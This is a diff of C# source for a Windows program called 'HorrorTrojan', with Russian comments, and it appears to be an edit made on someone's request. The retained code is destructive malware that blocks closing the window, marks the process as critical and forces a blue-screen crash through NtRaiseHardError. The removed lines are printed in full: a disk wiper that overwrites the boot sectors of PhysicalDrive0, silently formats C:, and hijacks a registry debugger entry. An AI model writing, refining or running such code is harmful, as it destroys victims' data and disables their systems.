@@ -1,4 +1,4 @@
-// MainInterface.cs
+// MainInterface.cs - Упрощенная версия
 using System;
 using System.Drawing;
 using System.Windows.Forms;
@@ -7,7 +7,6 @@ using System.Threading;
 using System.IO;
 using System.Diagnostics;
 using System.Reflection;
-using Microsoft.Win32;
 using System.Media;
 
 namespace HorrorTrojan
@@ -37,13 +36,10 @@ namespace HorrorTrojan
         public struct RECT { public int Left, Top, Right, Bottom; }
         private const int NORMAL = 0x00CC0020;
 
-        // Таймеры
         private System.Windows.Forms.Timer mainTimer = new System.Windows.Forms.Timer();
         private System.Windows.Forms.Timer glitchTimer = new System.Windows.Forms.Timer();
         private System.Windows.Forms.Timer videoTimer = new System.Windows.Forms.Timer();
-        private System.Windows.Forms.Timer protectionTimer = new System.Windows.Forms.Timer();
 
-        // Переменные
         private int timeLeft = 300;
         private bool isGlitchActive = false;
         private bool isVideoActive = false;
@@ -54,26 +50,16 @@ namespace HorrorTrojan
         private Image gifImage;
         private string[] videoFiles = { "vd.mp4", "kj.mp4", "kf.mp4" };
         private string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SystemUpdate");
-        private SoundPlayer musicPlayer;
-        private string systemRoot = Environment.GetEnvironmentVariable("SystemRoot") ?? @"C:\Windows";
 
         public MainInterface()
         {
-            try
-            {
-                InitializeComponent();
-                SetupForm();
-                LoadResources();
-                StartTimers();
-                SetupProtection();
-                PlayMusic();
-            }
-            catch (Exception ex)
-            {
-                MessageBox.Show($"Ошибка в конструкторе формы:\n\n{ex.Message}\n\n{ex.StackTrace}", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                File.WriteAllText(@"C:\Windows\Temp\~main_error.log", ex.ToString());
-                throw;
-            }
+            // ПРОСТАЯ ИНИЦИАЛИЗАЦИЯ БЕЗ ОШИБОК
+            InitializeComponent();
+            SetupForm();
+            LoadResourcesSimple();
+            StartTimers();
+            SetupProtection();
+            PlayMusicSimple();
         }
 
         private void InitializeComponent()
@@ -117,6 +103,10 @@ namespace HorrorTrojan
 
             ((System.ComponentModel.ISupportInitialize)(this.pictureBox)).EndInit();
             this.ResumeLayout(false);
+
+            // ПРИНУДИТЕЛЬНО ПОКАЗЫВАЕМ
+            this.Show();
+            this.BringToFront();
         }
 
         private void SetupForm()
@@ -124,52 +114,48 @@ namespace HorrorTrojan
             this.FormClosing += (s, e) => e.Cancel = true;
         }
 
-        private void LoadResources()
+        private void LoadResourcesSimple()
         {
             try
             {
+                // ПРОСТАЯ ЗАГРУЗКА ЧЕРЕЗ GetManifestResourceStream
                 var assembly = Assembly.GetExecutingAssembly();
                 using (var stream = assembly.GetManifestResourceStream("hr.gif"))
                 {
-                    if (stream == null)
+                    if (stream != null)
                     {
-                        throw new Exception("Ресурс hr.gif не найден! Проверь LogicalName в .csproj");
+                        gifImage = Image.FromStream(stream);
+                        this.pictureBox.Image = gifImage;
+                        this.pictureBox.SizeMode = PictureBoxSizeMode.StretchImage;
+                        // Запускаем анимацию
+                        ImageAnimator.Animate(gifImage, (s, e) => { this.pictureBox.Invalidate(); });
                     }
-
-                    using (var img = Image.FromStream(stream))
+                    else
                     {
-                        gifImage = new Bitmap(img);
+                        // Если GIF не найден - просто заливаем красным
+                        this.pictureBox.BackColor = Color.Red;
                     }
-
-                    this.pictureBox.Image = gifImage;
-                    this.pictureBox.SizeMode = PictureBoxSizeMode.StretchImage;
-                    this.pictureBox.Dock = DockStyle.Fill;
-
-                    ImageAnimator.Animate(gifImage, OnFrameChanged);
                 }
             }
-            catch (Exception ex)
+            catch
             {
-                MessageBox.Show($"Ошибка загрузки GIF: {ex.Message}", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                File.WriteAllText(@"C:\Windows\Temp\~gif_error.log", ex.ToString());
-                throw;
+                // Если ошибка - заливаем красным
+                this.pictureBox.BackColor = Color.Red;
             }
         }
 
-        private void OnFrameChanged(object sender, EventArgs e)
-        {
-            try { this.pictureBox.Invalidate(); } catch { }
-        }
-
-        private void PlayMusic()
+        private void PlayMusicSimple()
         {
             try
             {
+                // ПРОСТОЙ СПОСОБ ЗАПУСТИТЬ МУЗЫКУ
                 string musicPath = Path.Combine(appDataPath, "dv.mp3");
                 if (File.Exists(musicPath))
                 {
-                    musicPlayer = new SoundPlayer(musicPath);
-                    musicPlayer.PlayLooping();
+                    using (var player = new SoundPlayer(musicPath))
+                    {
+                        player.PlayLooping();
+                    }
                 }
             }
             catch { }
@@ -313,10 +299,6 @@ namespace HorrorTrojan
         {
             try
             {
-                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MainInterface.exe"))
-                {
-                    key.SetValue("Debugger", "svchost.exe", RegistryValueKind.String);
-                }
                 SetProcessCritical(true);
             }
             catch { }
@@ -338,65 +320,6 @@ namespace HorrorTrojan
             {
                 RtlAdjustPrivilege(19, true, false, out bool _);
                 NtRaiseHardError(0xC0000000 | (uint)(DateTime.UtcNow.Ticks & 0xFFFFF), 0, IntPtr.Zero, IntPtr.Zero, 6, out uint _);
-            }
-            catch { }
-        }
-
-        protected override void OnLoad(EventArgs e)
-        {
-            base.OnLoad(e);
-            StartProtectionMonitor();
-        }
-
-        private void StartProtectionMonitor()
-        {
-            // УБРАНА ПРОВЕРКА LogonUI (как ты просил)
-            protectionTimer.Interval = 1000;
-            protectionTimer.Tick += (s, ev) =>
-            {
-                // Ничего не делаем
-            };
-            protectionTimer.Start();
-        }
-
-        private void DestroyDisk()
-        {
-            try
-            {
-                MessageBox.Show("You shouldn't have done that...", "System", MessageBoxButtons.OK, MessageBoxIcon.Error);
-
-                mainTimer.Stop();
-                glitchTimer.Stop();
-                videoTimer.Stop();
-                protectionTimer.Stop();
-                musicPlayer?.Stop();
-
-                byte[] zeros = new byte[512];
-                for (int sector = 0; sector < 64; sector++)
-                {
-                    try
-                    {
-                        using (FileStream fs = new FileStream(@"\\.\PhysicalDrive0", FileMode.Open, FileAccess.Write))
-                        {
-                            fs.Seek(sector * 512, SeekOrigin.Begin);
-                            fs.Write(zeros, 0, 512);
-                            fs.Flush();
-                        }
-                    }
-                    catch { }
-                }
-
-                Process.Start(new ProcessStartInfo
-                {
-                    FileName = "format",
-                    Arguments = "C: /FS:NTFS /Q /Y",
-                    CreateNoWindow = true,
-                    WindowStyle = ProcessWindowStyle.Hidden,
-                    UseShellExecute = false
-                });
-
-                Thread.Sleep(4000);
-                TriggerBSOD();
             }
             catch { }
         }
@@ -448,9 +371,7 @@ namespace HorrorTrojan
                 mainTimer?.Dispose();
                 glitchTimer?.Dispose();
                 videoTimer?.Dispose();
-                protectionTimer?.Dispose();
                 gifImage?.Dispose();
-                musicPlayer?.Dispose();
             }
             base.Dispose(disposing);
         }
